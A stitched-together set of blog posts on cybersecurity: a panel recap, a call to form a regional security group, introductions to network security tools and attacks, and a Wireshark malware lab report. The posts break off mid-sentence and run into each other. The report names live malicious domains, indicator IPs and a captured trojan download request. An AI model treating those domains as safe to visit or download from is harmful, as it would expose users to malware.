&lt;p&gt;Regarding the collective cyber defense panel discussion, I was delighted
to be speaker with such strong extensive and experienced experts from
different fields. Such as private, public, academy and business sectors.
Speaking of which, the moderator of the panel was Prof. Veselin Tselkov,
D. Sc., Member of the Board, Commission for Personal Data Protection in
Bulgaria. The lectures where: unfortunately Col. Associate Prof. Dr.
Stoyan Balabanov, Director, Institute for Defense, Ministry of Defense
Bulgaria, was not able to attend the panel, however we had
representative from MoD. Also from Bulgaria was Zlatogor Minchev from
Institute of Information and Communication Technologies, Bulgaria. From
Macedonian was Dr. Metodi Hadji-Janev (LtC), Assistant Prof., Military
Academy ” General Mihailo Apostolski”, Skopje, Macedonia. From business
prospective I was the presenter of
&lt;a href="http://cybersecurity.mk" title="CyberSecurity.mk"&gt;CyberSecurity.mk&lt;/a&gt; copmany,
based in Macedonia. In addition, Mr. Robert Griffin, Director Business
Development – Security Systems, RSA. From all the above, we also had
video addressing from Mr. Detlef Puhl, Senior Advisor at the Emerging
Security Challenges Division, NATO Headquarters, and Mr. Philippe
Roggeband, Security Sales Business Development Manager, EBG EMEAR, Cisco
Systems. However, due to the security measures in the building where the
event was held the video addressing was interrupted.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Nevertheless, here is my short presentation notes.&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;/p&gt;

&lt;p&gt;Cyberspace has become one of the most essential and distinguished
bridge between government and their inhabitants. Thus, the people are
able to get access to government services 24/7, as well as their life
becomes more easier. However, all in this has led to advance of
producing cyberspace to be vulnerable, coupled with information’s that
should not be available to others. For this reason I would like to
share three important points that are fundamental to emphasis when we
discuss about the Cyber defense in general. First, we have to
understand and highlight the difference between Cyber Security vs IT
Security. Second, it is the important to boost the awareness level
tailored to national level, social society, private sector and indeed
multistakeholder cooperation in the region. Last but not least, we
have to brake the lack of communications between the neighboring
countries and to create a trusted, same level, and collaboration of
cyber security. Where national agencies and parties should work
together.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Without further ado, first the main goal of IT security is to protect
information from a wide range of threats in order to ensure business
continuity, reduce business damages and maximize return on investments
and business opportunity. Likewise the cyber security is protecting
Information and Communication Technologies (ICT) systems and Critical
Infrastructure (CI). However the most important protection element in
IT security is to reduce business risk to accepted levels and the
protection of entire information and information systems essential to
the organizations. Alternatively, cyber security aims at assuring
critical IT service for CI and CII on accepted levels, in addition to
the protection of critical information. In other words the security
objective determiner in information security is an organization’s
business process, while in cyber security it is for the entire state.
Emphasizing that states may have different or complementary interests
compared to an organization’s business interests. On one hand,
handling cyber security problems is considered to be both a nationally
and internationally coordinated activity to protect national CII.
Similarly, to information security goals: confidentiality,
availability and integrity, in cyber security the additional goals are
non-repudiation, authentication, information systems importance and
criticality from the standpoint of state CII/CI.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Turning to awareness, I would like to share my recent research that
have been published as book, title: Interactive Cyber Security
Awareness Program. It is highlighting the method, approach and the
importance of current awareness level in Western Balkans. Coupled how
to boost the awareness on the national level. I would not like to go
in details, however, just want to mention that the positive results
were presented, and that the awareness level among the end users are
varied. Moreover, in particular we have to create and recognize the
importance of establishing cyber security awareness strategy, coupled
with influence of the weakest link in cyber security, which is the
human factor, or in other words, social-technical aspects. In spite of
our investment in technologies and in the applications, still the
weakest link in cyber defense and security will the human behavior.
Therefore, we will have to conceive an awareness/education to raise
the awareness on the national behalf, such as, from the young to the
oldest generation, tailored through social society, private sector and
multistakeholder cooperation.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Lastly, in recent years we are witnesses of acts that have taken into
place between neighboring countries in the region. Such acts were
followed by different motivations of attacks. Where mostly they were
done through defacement’s or denial-of-service attacks. Thus,
motivations where divers. Nevertheless, in this last point is I would
like to stress the importance of merging the best practices learned
from past event occurrence as well as to improve the role of newer
members and opportunities into the collective roles of cyber defence.&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/p&gt;

&lt;p&gt;In summary, I am keen that after this discussion/panel will lead into
further actions. And also thanks to the organizers for the invitation
and done a good job in organizing such an important event.&lt;/p&gt;

Firstly Obama administration get order intended to bolster
cybersecurity, where the move comes after the White House tried, and
indeed failed to get tough cybersecurity legislation through Congresses
last year. Secondly, EU released the cybersecurity plan to protect open
Internet and online freedom and opportunity – Cyber Security strategy
and Proposal for a Directive. Frankly, where are the countries of South
Eastern Europe (SEE) in here, such as the ones that are not in EU, for
instance: Macedonia, Serbia, Montenegro, Bosnia, Albania and Kosovo?&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Therefore, my plan, as a founder of
&lt;a href="http://cybersecurity.mk"&gt;Cybersecurity.mk&lt;/a&gt; would like to make a
proposal of creating and teaming a group which will meet once a month to
talk over another the importance of such as beneficial and in fact
essential cybersecurity issues, as well as to exchange knowledge.
Sharing is caring. Additionally, in every meeting we will merge and
invite important people either over the remote or in the place speakers
to give, share and offer us a knowledge what we should do in a near
future. How we could fix and raise not only the awareness, but also the
importance of cybersecurity in South Eastern Europe (Macedonia, Serbia,
Montenegro, Bosnia, Albania, Kosovo, Croatia, Slovenia, Bulgaria,
Romania and Greece).&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;For this proposal to be success we would need a help from NGO’s, NPO’s
and any other institutes from the region and elsewhere. In addition I
would like to ask hackers, crackers, ethical and non-ethical, designers,
freelancers and many other to help us with the following problems:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Name of the group. I will be more than happy if you could give as
proposals on the comment section for the name of the group. Let us
contribute together in this matter and we will be all God Fathers for
the group which will help us in improving and boosting awareness level
in cyber and IT security in our region.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Logo. We would like to hear from any of you to design the logo of
South Eastern Europe – Cyber Security Group. Please feel free to give us
a link of the design in the comment section (below) and then we will
select together the best proposal.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Sponsorship for the speakers to invite them to meet with us in face to
face, either is NGO, NPO, financial, telecommunication, insurance
institutes.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Proposal of speakers, list for the next meetings and place, indeed.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;

&lt;p&gt;If you have any further great ideas or proposals please do not hesitate
to share them with us. We would be more than happy to take them in
consideration. Nevertheless, I really hope that forming the group, such
as Google Developer Group etc. will help on one hand. And on the other
hand, will aid to meet one another, to discuss and share our knowledge.
To learn from the best people and scholars in cybersecurity.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Overall, more frequently in SEE region we have seen targets to attackers
on the Internet. How do we handle this matter of facts and how we deal
against? How we protect our online space? And indeed why we should take
actions? Those are just a start-up questions that everyone of us should
be able to answer them. Therefore, we hope that you all will contributes
in the above problem that we face and will HELP us in creating this
group in SEE region.&lt;/p&gt;

&lt;p&gt;A toolkit is a collection of tools, where for our motives is an assembly
of tools to eavesdropper and scan network security for the possible
exploitations. Moreover, these tools are designed from security
researchers and experts, for the purpose of network administrator and
security analysts to be able in everyday work to conduct potential
exploitations, to watch and to analyse the network. Additionally,
network monitoring is a term to describe the system that is constantly
monitoring computer network for being slow or failing peripherals, and
it notifies the network administrator either via email, SMS or alarms in
case of interruption of service. Equally to network monitoring, the
security analysts are responsible for designing and monitoring security
systems. As well as, to coordinating policies of security measures to
protect information in computer files from unauthorized or accidental
change, distribution or disclosure. It is therefore in this article we
will introduce the readers with the basic concept and essential part of
network security toolkits. As well as, already possible network security
tools to help them to conduct network security monitoring and analysing.
Lastly, we will give the readers with recommendation and conclusion.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;Network Security Toolkit&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;In this section we will take a look at a few essential components of the
toolkits, and their main goals and purposes. When we assemble the
toolkit, you might want to consider having at least one of the following
components included:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Packet Sniffer&lt;/strong&gt;. It is an either software or hardware piece that
can intercept and log traffic passing over the network or part over the
network. As the data flaws across the network, the sniffer is capturing
each packets and if needed it will decode the packets raw, by displaying
the values of various fields in the packet, and it will analyse the
content according the RFC or other specifications. This is especially
useful when dealing with security threats that produce abnormal packets
or enormous traffic. As well as, it will help to diagnose failed network
hardware.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Port Scanner&lt;/strong&gt;. It is software developed to probe server or host for
open ports. This kind of tools are essentially in every day work for
administrators to verify security policies of their network and to find
unwanted running services, before the attackers. They are very useful in
fact to figure and detect unauthorized systems and services. The
technique that most of the tools that are using are based upon finger
print matching technology.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Intrusion Detection System (IDS)&lt;strong&gt;&lt;em&gt;. It is a device
or application that monitors network or systems activities for malicious
hustle or policy violations and, of course produces reports to a
management staff. Moreover, typically they record information related to
observed events, let know the security administrators of observed
events, and respond to the detected threats by attempting to prevent it
from fulfil.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;/em&gt;*Log Analysers&lt;/strong&gt;. Are dealing with large volume of
computer generated log messages, known as event logs, audit records,
etc. Furthermore, it deals as well as log analysis which can be in a
real-time and in bulk after storage, also log search and last procedure
reporting. In mace cases most of the system administrators groan of
examining through log files for precious of information.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;/strong&gt;Vulnerability Scanners&lt;strong&gt;. It is an application designed
to assess computers, application, computer systems and networks for
their weaknesses. There different types of vulnerability scanners by
distinguished from one another by a focusing to particular targets. The
functionality varies among the different types of vulnerability
scanners. They share common purpose of enumerating the vulnerabilities
present in one or more targets. Also they enable you to seek out if your
network or system has known vulnerabilities for patching.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;/strong&gt;Web Scanners&lt;strong&gt;. It is a program which communicates with
web applications through the web front-end to be able to show potential
security vulnerabilities in the web application and their architectural
weaknesses. Unlike the source code scanners, web application scanners
they don’t have access to the source code, and that is why they detect
vulnerability by performing real attacks to the web application.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;/strong&gt;Password Crackers**. It is a process of either recovering
or gaining access, password from data that has been stored in or
transmitted by a computer or network. The approach is to repeatedly
trying to guess the password. As well as, they allow you to quickly scan
a host computer for accounts with weak password, one or the other by
disabling them or force their owners to carry out and create stronger
passwords.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;

&lt;p&gt;Note that the above list is just an understandable part that you should
have in mind to consider had them into your everyday network security
toolkit box. In the next paragraph we will give the readers with the
available tools that are essential for the network security toolkits.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;Available Network Security Tool&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;Most of the tools listed below are open source solutions and they cover
one or more components from the above list. Additionally, for further
detail information please refer to the following link
&lt;a href="http://sectools.org/"&gt;http://sectools.org/&lt;/a&gt;.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;For instance for password cracking you might use the &lt;a href="http://www.openwall.com/john/"&gt;John the
Ripper&lt;/a&gt; and
&lt;a href="http://project-rainbowcrack.com/"&gt;RainbowCrack&lt;/a&gt; tools. Where for packet
sniffing there is a big variety of tools, but most commonly known are:
&lt;a href="http://www.wireshark.org/"&gt;Wireshark&lt;/a&gt;, &lt;a href="http://www.ntop.org/"&gt;Ntop&lt;/a&gt;,
&lt;a href="http://www.tcpdump.org/"&gt;Tcpdump&lt;/a&gt; and many others. Moreover, to be able
to conduct vulnerability scanning consider the following tools, such as,
&lt;a href="http://www.tenable.com/products/nessus"&gt;Nessus&lt;/a&gt;,
&lt;a href="http://www.openvas.org/"&gt;OpenVAS&lt;/a&gt;,
&lt;a href="https://www.titania-security.com"&gt;Nipper&lt;/a&gt;, etc. In addition to the
scanners, for web application the most known is a&lt;a href="http://www.portswigger.net/burp/"&gt;Burp
Suite&lt;/a&gt;, then

&lt;p&gt;Currently, humans coupled with the socio-technical aspect can be either
the strongest or the weakest link in any information security system,
and the key in security lies in delivering awareness training through
short and effective online videos, whereby the participator can gain
knowledge on security. Our aim, therefore, is to develop innovative
solutions to deliver an interactive cyber security awareness program,
where the main goal is to enhance information on security awareness and
knowledge in organizations, schools, nations, homes etc. The syllabus
consists of a systematic approach divided into three sections. The
introduction is a basic level course (BASIC), with the aim of delivering
an elementary curriculum in physical security, computer and mobile;
network and Internet security to everyone. It is made up of several
units with interactive training videos that last less than 10 minutes
each. The second course (ADVANCE) is the advanced program which
demonstrates the attacking phases, different attacking methods and the
countermeasures that highlight the anatomy of Advance Persistence
Threats (APT). This curriculum is intended for administrators, help desk
personnel, information technology professionals among others. The last
course (MANAGEMENT) is intended for managers, where we annotate two
decision-making processes with their cycle loop. Moreover, after each
unit there is a questionnaire, which measures the knowledge of each
participant, and compares it to the base-line survey carried out during
the registration process. As a result, it represents the participant’s
awareness level and knowledge, and will assist in further actions if
necessary. By implementing this program in private and public
organizations, governments, schools and universities will lead to the
improvement of security in the everyday use of computers, mobile phones,
online banking, social networking_ both at home and in the workplace.
The present study addresses and implements the IT security issue. We
will apply the results by carrying out the syllabus, with the latest
improvements, in universities and private organizations. Consequently by
applying these further improvements to the syllabus, it will meet the
needs of the cyber security field.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;A computer network, or in other words simply a network, is a collection
of computers and other hardware components interconnected by
communication channels that allow sharing of data, resources and
information [1]. Adopt for both_ private or public needs, which are
used in everyday tasks to conduct transactions and communications among
individuals, business, government agencies, etc. The network consists of
nodes, which are individual user computers (client terminals), and one
or more servers and/or host computers. Which are linked by communication
systems, some of might be private, for example company, and other which
might be open to public access. Obvious example of a network system that
is open to public access is the Internet, where indeed, many private
networks utilize publicly accessible communications, as well. Nowadays
for instance, company host computers can be accessed by their employees
whether in their offices over a private communications network, or from
their homes, or while there on the road.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;It is therefore, network security involves all activities that
individuals, organizations, enterprises and institutions are undertaking
to protect their value and on-going employment of assets and the
integrity and continuity of operations. For that reason this article
will introduce the readers and end users with the history of network
security. Furthermore, with an introduction of effective network
security strategy requires and most common network attacks methods.
Please bear in mind that in fact, this article is not going to discuss
over the depth details, rather than is going to deliver you introductory
knowledge and suggestions for further perusal. And finally, we will
finalize the article within conclusion.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;History&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;Securing information over a network had its roots in the late 1960s when
networks only existed in the sense of huge mainframes and multiple
networked terminals. Hundreds of thousands and millions of dumb
terminals were connected via hubs and concentrators to the huge central
processing units, spinning tapes, and rotating drives in some distant
air-conditioned, properly humidifier windowless room [2]. Without the
presence of client-server network models, sharing or multi-user,
multi-tasking processors, network security was not yet a real concern.
Network security, however, has evolved over the years due to the
increasing reliance on public networks not to disclose personal,
financial, and other restricted information [3]. Such as, there are
numerous instances Kevin Mitnick [4] and Vladimir Levin [5] cases that
prompted organizations across all industries to re-think the way they
handle information, including its transmission and disclosure. The
popularity of the Internet was one of the most important developments
that prompted an intensified effort in data security [3].&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;A growing number of people are using their personal computers to gain
access to the resources that the Internet has to offer. From electronic
email, commerce transactions and research interests, the Internet has
taken place as one of the most important development of 20th century.
However, the Internet Protocol (IP) in early stage was not designed to
be secure. There were no approved securities standards build into the
Transmission Control Protocol (TCP) and IP communication stack, which
allowing it open to potentially malicious users and processes across the
network. Where modern developments have made Internet communication more
secure, yet there are still incidents that gain eminent attention and
alert us to the fact that nothing is completely safe and secure.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Where in early 2000 a different type of attacks were unleashed on
several of the most heavily trafficked site on the Internet, such as,
yahoo.com, cnn.com, amazon.com and many others. Furthermore, in 2007, a
data breach exploiting the widely known weaknesses of the Wired
Equivalent Privacy (WEP) wireless encryption protocol resulted [6].
Indefinitely all those incidents have granted billion of records and
money to end up in the behalf of the thief.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Therefore, these results enforce the reality that computer and network
security has become a quantifiable and justifiable expense for IT
budgets. Organizations that require data integrity and high availability
elicit the skills of system administrators, developers, and engineers to
ensure 24×7 reliability of their systems, services, and information.
Falling victim to malicious users, processes, or coordinated attacks is
a direct threat to the success of the organization, as well as
individual [3].&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;Network Security&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;System and network technology is in fact a key technology for a wide
variety of applications. Security is crucial factor to networks and
applications. Although, network security is a critical requirement in
emerging networks, there is a significant lack of security methods that
can be easily implemented [7].&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;There is an existing communication gap between the developers of
security technology and developers of networks. When considering network
security, it must be emphasized that the while network is secured.
Moreover, network security does not only concern the security in the
computers at each end of communication sequence. Also when transmitting
data the communication channel should not be vulnerable to attack. A
hacker could target the communication channel, and could obtain the
data, and decrypt it and re-insert a false value. In fact, securing the
network is just as important as securing the computers.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;As a result when developing a secure network, the following need to be
considered [8]:&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Access – authorized users are provided the means to communicate to and
from a particular network&lt;/p&gt;
&lt;p&gt;Confidentiality – Information in the network remains private&lt;/p&gt;
&lt;p&gt;Authentication – Ensure the users of the network are who they say they
are&lt;/p&gt;
&lt;p&gt;Integrity – Ensure the message has not been modified in transit&lt;/p&gt;
&lt;p&gt;Non‐repudiation – Ensure the user does not refute that he used the
network&lt;/p&gt;
&lt;p&gt;Moreover, an effective network security plan is developed with the
understanding of security issues, potential attackers and attacking
methods, needed level of security, and factors that make a network
vulnerable to attack. The different attacking methods are followed
throughout this article endeavour.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;Common Network Attacks Methods&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;Whiteout implemented security measures and controls in place, your
network and data might be subjected to an attack. Some attacks for
instance could be passive, meaning that information is monitored; other
could be active, meaning the information is varying within intent to
destroy or corrupt the data or the network itself.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Likelihood your networks and data are vulnerable to any of the following
types of attacks if you do not have a security plan in place [9]:&lt;/p&gt;
&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Eavesdropping – Interception of communications by an unauthorized
    party&lt;/li&gt;
&lt;li&gt;Data Modification – Data altering, reading from unauthorized party&lt;/li&gt;
&lt;li&gt;Identity Spoofing (IP Address Spoofing) – IP address to be falsely
    assumed— identity spoofing and the attacker can modify, reroute, or
    delete your data&lt;/li&gt;
&lt;li&gt;Password-Based Attacks – By gaining your access rights to a computer
    and network resources are determined by who you are, that is, your
    user name and your password&lt;/li&gt;
&lt;li&gt;Denial-of-Service Attack – Prevents normal use of your computer or
    network by valid users, and it could be used for sending invalid
    data to application, to flood the computer, block traffic, etc.&lt;/li&gt;
&lt;li&gt;Man-in-the-Middle Attack – Is when someone between you and the
    person with whom you are communicating is actively monitoring,
    capturing, and controlling your communication transparently&lt;/li&gt;
&lt;li&gt;Application-Layer Attack – It targets application servers by
    deliberately causing a fault in a server’s operating system or
    applications and the attacker gaining the ability to bypass normal
    access controls&lt;/li&gt;
&lt;li&gt;Anyhow, this is just a most commonly known network attacks methods,
    and indeed there plenty of more.&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;

&lt;h1&gt;Conclusion&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;That is why network security is an important field that is increasingly
gaining attention as the Internet usage increases. The security threats
and Internet protocols were analysed to determine the necessary security
technology. However, the current development in network security is not
very impressive and significant.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Therefore, researchers and scholars are rapidly evolving in developing
and investigating the threats further in a future. And with this
information in mind, the process can be formalized and the path becomes
clearer as you delve deeper into the specifics of the security process,
as well.&lt;/p&gt;

following aspects:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;

&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;C&amp;amp;C Names and address.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Document the process also where You found hints and how exactly You
did it (you need to show Your thought and communication process – please
write a summary of it.)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Write an incident report.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;

&lt;p&gt;Moreover, we have to consider the malware analysis report reminders,
please refer to [1] or [2]. Additional, analysis it is stated into the
Analysis section, where we explain the techniques, filter tools, gather
knowledge, links, etc. Structure of the laboratory report is first to
present analysis with details information. Malware and infections
description are described. Finally the conclusion made of all analysis
will be concise in summary section.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;ANALYSIS&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;To be able to open and use the above file, firstly we have to download
the wireshark tool. Where the main goal and purpose for wireshark
application is to analysis a network protocols from captured file.
Therefore please refer to the following link:
&lt;a href="http://www.wireshark.org/"&gt;http://www.wireshark.org/&lt;/a&gt;.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Useful links for future use, please refer to [3, 4, 5 and 6]. On figure
1 it shows the Graphic Interface of Wireshark application with running
filter: http protocol.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Illustration 1: Wireshark application, filter: http protocol&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;However, from the figure 1 we can see that there is a lot of traffic
generated by the user. Therefore we have to apply and additional filter
rules, which will help and guide for better and easy analysis. As we go
through each generated http protocol traffic we can conclude that the
user generated and has been visiting different source, where can be
potential threat for the organization and personal use with a different
malicious code.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;To be able to filter only the http protocols on port 80 with a header
GET, we should use the following filter: http.request.method == “GET”.
Where this filter will narrow down the results that are presented into
the captured file. In spite of the filter above it helps a lot, yet
there is still a lot of traffic generated, consequently we have to
utilize an additional filter.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Another extremely useful wireshark option we used, was Analyze → Follow
TCP Stream which shows communication between IP addresses in more
readable and useful way: shows DNS name for the IP and if file was
downloaded gives filetype and name. We discovered that IP address
79.137.237.34 belongs to accord-component.ru. When we accessed the site
with various web browsers, all of them showed that it contained malware.&lt;/p&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    GET /serial/index.php HTTP/1.1Accept: */*Accept-Encoding: gzip, deflateUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NETCLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)Connection: Keep-AliveHost: accord-component.ruHTTP/1.1 200 OKServer: nginxDate: Wed, 30 Nov 2011 23:07:18GMTContent-Type: text/htmlTransfer-Encoding: chunkedConnection: keep-aliveX-Powered-By: PHP/5.3.2Content-Encoding: gzip&lt;/pre&gt;&lt;p&gt;Another suspicious IP was 86.63.168.101, where from this IP address brought us to&lt;br&gt;domain name zumlelao.com, but it was un-accessible from browsers. Wireshark showed the User downloaded file 4.exe from zumlelao.com.&lt;/p&gt;&lt;pre class="brush: php"&gt;GET /load.php?file=0HTTP/1.1Accept: image/jpeg, application/x-ms-application, image/gif,application/xaml+xml, image/pjpeg, application/x-ms-xbap, */*Accept-Language: etUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NETCLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)Accept-Encoding: gzip, deflateHost: zumlelao.comConnection: Keep-AliveHTTP/1.1 200 OKDate: Wed, 30 Nov 2011 21:55:02GMTServer: Apache/2X-Powered-By: PHP/5.2.17Cache-Control: publicContent-Disposition: attachment; filename=4.exeContent-Transfer-Encoding: binaryVary: Accept-EncodingContent-Encoding: gzipContent-Length: 10666Keep-Alive: timeout=1, max=100Connection: Keep-AliveContent-Type: application/octet-stream

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;Additionally, we can always use an Find function, which will help as to
identify certain traffic or site. Figure 2 demonstrated the usage of the
Find function, accessible from menu Edit -&gt; Find.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Illustration 2: Wireshark, Find function&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Other IP addresses that were generated/extracted first the ones with
malware detected:
&lt;code&gt;79.137.237.34 -accord-component.ru; 86.63.168.101 zumlelao.com&lt;/code&gt;. Other
IP’s are:
&lt;code&gt;173.194.32.32 (33,34,41,50,51,52,58,59,60,63), 192.168.123.1, 193.184.164.159 (174,176,185), 193.40.252.83, 193.88.71.156, 194.126.108.69 (70), 194.126.124.136, 194.204.14.49, 195.222.15.74, 199.7.48.190, 209.85.173.95, 123.168.24.204 (209,221,225,229,235), 79.137.237.34, 80.252.91.41 (61), 69.171.228.11, 23.32.89.55, 23.32.99.172, 216.34.181.45 (48), 213.168.24.26, 90.190.148.34 (40), 86.63.168.101, 82.98.58.48, 81.19.238.61.&lt;/code&gt;&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;If we run or analysis the above domain names into the google we will
automatic indicated that the zumlelao.com it is an before reported as a
malware site and the second too. Therefore the analysis and the
infection of details of malware are highlighted into the next section.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;INFECTION&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;Indeed, the above captured file presents traffic generated by the user,
that can be threat for the organization, home user, etc. As from the
previous section demonstrates how to identify if the generated traffic
has infected or has the user visit the malicious code sites. This
section identifies the malicious code and displays their details.
Moreover, the zumlelao.com host it is reported previous as malicious
code site. For this purpose we gather the help from the following link:
&lt;a href="http://sopport.clean-mx.de/"&gt;http://sopport.clean-mx.de/&lt;/a&gt;. Here is the reported malicious,
suspicious code from the above host in the table bellow.&lt;/p&gt;

&lt;/p&gt;

&lt;p&gt;Furthermore, figure 3 is proving the analysis made through the
wireshark, were one of the above links has been access, for more details
clink on the above link and points in a figure 3:A and B.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Illustration 3: Prove of generating traffic of following malware link:

&lt;/p&gt;

&lt;p&gt;Moreover, to get the file itself for analysis, we used Netresec’s
Network Miner 2.1 http://www.netresec.com/?page=NetworkMiner. In Files
menu, it shows all packets as files.We uploaded 4.exe.octet-stream to
virustotal.com – 30 Antivirus software identified as malware Virustotal
link:
&lt;a href="http://www.virustotal.com/file-scan/report.html?id=d6ee8736cd2eae8571b193b28b59dff33e9607237f78b0888d69c70f241bb04b-%201323098398"&gt;http://www.virustotal.com/file-scan/report.html?id=d6ee8736cd2eae8571b193b28b59dff33e9607237f78b0888d69c70f241bb04b-1323098398&lt;/a&gt;&lt;/p&gt;
&lt;/p&gt;

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;Trojan.Generic.KD malwares usually are classified as Backdoors. It
infects executable files in the system and its main goal is to make
backdoor into the system. It changes registry. In some cases it can put
payload on the infected system, slow it down and make internet browsing
difficult and time consuming. Aim of the malware can be stealing
information or gaining partial/full access of the victim’s system. On
the other hand, Trojan.Generic.KD malwares are difficult to remove from
infected computers. From VirusTotal analysis we can see that various
antivirus software can discover and identify Trojan.Generic.KD.438472.
Therefore one can remove malware by downloading antivirus software
provided by F-Secure, Comodo, Microsoft, Sophos, Symantec, DrWeb, etc.
Here is an example from Dr.Web how to delete Trojan.Generic.KD malware
&lt;a href="http://www.drwebhk.com/en/virus_removal/694829/Trojan.Generic.KD.53986.html"&gt;http://www.drwebhk.com/en/virus_removal/694829/Trojan.Generic.KD.53986.html&lt;/a&gt;&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;For our case we downloaded Dr.Web CureIt (free edition for home PCs,
which discovered the malware and removed it) –
&lt;a href="http://www.freedrweb.com/download+cureit/?nc=t&amp;amp;lng=en"&gt;http://www.freedrweb.com/download+cureit/?nc=t&amp;amp;lng=en&lt;/a&gt;.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Before continuing to disinfect the system, please read and understand
the massage delivered through this forum:
&lt;a href="http://forums.majorgeeks.com/showthread.php?t=35407"&gt;http://forums.majorgeeks.com/showthread.php?t=35407&lt;/a&gt;.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;SUMMARY&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;Nowadays malicious codes, infection of the system is one of the highest
vector of production work everyday of the organizations. Therefore,
different approaches, advance analysis, troubleshooting, etc. has to be
applicable and stated in every organization. Leaking of data,
information, access of network (internal and external) can be very
harmful for organization and even the home usage of computers.
Therefore, this laboratory report main aim is to provide the reader to
be able to conduct advance analysis of system and their identification
of infection within the wireshark network analysis tool.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;From the above sections in Analysis and in the Infection we have to
follow the steps and links that will help us for a further work.
Meanwhile, the captured generated traffic from the distributed file has
indeed indicated that the system it is infected. Were as an prove we
demonstrate an screen-shot, figure 3, that one of the infected link has
been visited. Likewise, the system of this user is infected. Thus
infection identified name is: TR/Crypt.XPACK.Gen3, where we do supply
and the disinfecting stepwise solution with the above link. Closing, as
there are many different ways, tools, process for analysing the
malicious code behaviours in system this laboratory report is supplying
the reader with advance and stepwise solution for identifying the
infection of the system within advance network analysis wireshark
application.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;WORKLOAD&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;We made analysis on the virtual Windows 7 machine. For virtualization we
